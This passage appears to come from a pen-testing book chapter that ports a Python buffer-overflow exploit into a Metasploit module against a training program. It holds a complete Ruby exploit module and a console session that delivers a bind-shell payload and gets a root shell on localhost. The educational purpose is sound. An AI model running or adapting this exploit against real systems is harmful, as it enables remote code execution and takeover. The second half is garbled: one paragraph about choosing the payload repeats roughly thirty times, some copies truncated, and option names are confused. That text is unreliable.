
```ruby
'DisclosureDate' => '', 
'DefaultTarget' => 0))
def show
end
def exploit
end
end
```

# Porting the Exploit Code

Now that we have our initialization method set up, it's time to add our exploit code. We need to take the code we wrote in Python, and convert it to use the tools from within Metasploit to make the exploit more random as well as simplify our code. The exploit method is what runs when we type exploit into Metasploit. We will want to add some additional debugging information for this portion of the module so that if something happens we know what point it broke. Let's look at the final exploit code.

```ruby
##
# This module requires Metasploit:
http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
## require 'msf/core'
class Metasploit4 < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::Tcp
  def initialize(info = {})
    super(update_info(info,
      'Name' => 'CFPT CH10 Buffer Overflow RCE',
      'Description' => 'Demo for Coding for Pen Testers need to know',
      'License' => MSF_LICENSE,
      'Author' => ['me@localhost'],
      'References' => [
        ['URL', 'http://www.amazon.com/Coding-Penetration-Testers-Building-Better/dp/159749290/']
      ]
    ),
      'Platform' => 'linux',
      'Targets' => [
        ['Kali 2.0', { 'Ret' => 0xffffcc50 }]
      ],
      'Payload' =>
      {
        'Space' => '728',
        'BadChars' => "\x00\x0a\x0d"
      },
      'Privileged' => false,
      'DisclosureDate' => '',
      'DefaultTarget' => 0)
)
    register_options(
      {
        Opt::RPORT(8000)
      })
  end

  def exploit
    print_status('Connecting...')
    connect
    sock.get_once
    buf = rand_text_alpha(268)
    buf << [target['Ret']].pack('V')
    buf << make_nops(32)
    buf << payload.encoded
    buf << make_nops(1024 - buf.length)
    print_status('Sending Exploit...')
    sock.put(buf)
    print_status('Disconnecting...')
    disconnect
  end
end
```

We see that we have added a `register_options` function inside our initialize function. What this does is set up so that our LHOST variable be be 8000 by default so that we don't have to type it in. We deleted the check method because it would likely crash our application. Next we modified the exploit method.

We start by printing a status line that we are connecting then we use the "connect" method from the Tcp mixin we added earlier in our code. This will connect us to the remote system. We also want to retrieve the information that the program sends us via the connected socket so we issue the command “sock_get_once”.

Next, we build our buffer. We start out by using `rand_text_alpha` to generate random alphabet characters instead of just sending A’s. This is so that the exploit looks a bit more random. We append the EIP value that we got from our initialize function and then use the “pack” function to turn into network byte order. We append 32 NOP instructions through `make_nops`. We append our encoded payload that Metasploit will generate for us when we send a payload inside msfconsole. It knows based on the size restrictions we placed how big the encoded payload can be so that ensures we don’t generate a buffer that is too large. Finally, we call `make_nops` again to fill in the rest of our 1024 characters with NOP instructions.

The next step is to send the exploit, so we print out a status message and then send our buffer to the payload to decide what to do next. Metasploit will handle this for us, so all we need to do is disconnect from the remote system. We print out the status message and disconnect, and then end our exploit function.

# Executing the Exploit

Let’s try it out. We load the Metasploit console by typing `msfconsole -q` at the command prompt. Once we see the msf > prompt, we are ready to go. Fig. 9.11 shows the sequence of commands we need to use to configure the vuln exploit. We use the module we created by typing `use exploit/linux/vuln`. This is the path we used to save the module in our home directory. Next, we configure the RHOST variable to set the target we will be exploiting, in this case 127.0.0.1.

```bash
root@kali:~# msfconsole -q
msf > use exploit/linux/vuln
msf exploit(vuln) > set HOST 127.0.0.1
RHOST = 127.0.0.1
msf exploit(vuln) > set payload linux/x86/shell/bind_tcp
payload = linux/x86/shell/bind_tcp
msf exploit(vuln) > set LPORT 8675
LPORT = 8675
msf exploit(vuln) > exploit
```

- Connecting...
- Started bind handler
- Sending Exploit...
- Disconnecting...
- Sending stage (36 bytes) to 127.0.0.1
- Command shell session 1 opened (127.0.0.1:53033 -> 127.0.0.1:8675) at 2016-05-02 03:21:22 -0400

id
uid=0(root) gid=0(root) groups=0(root)

# FIGURE 9.11 Executing our exploit module.

Now, we set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for... To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

Now, we set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

Now, we set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where...

Now, we set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where...

Now, we set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where our initial string we will send will be small and will retrieve a larger portion of the stage from our system. To list all the payloads available, we can type in `show payloads` and choose any of the payloads available for the platform we are exploiting.

The final step is to set the payload we want to use for this exploit, in this case the linux/x86/shell/bind_tcp module. Remember that this is the stage version of the module where...
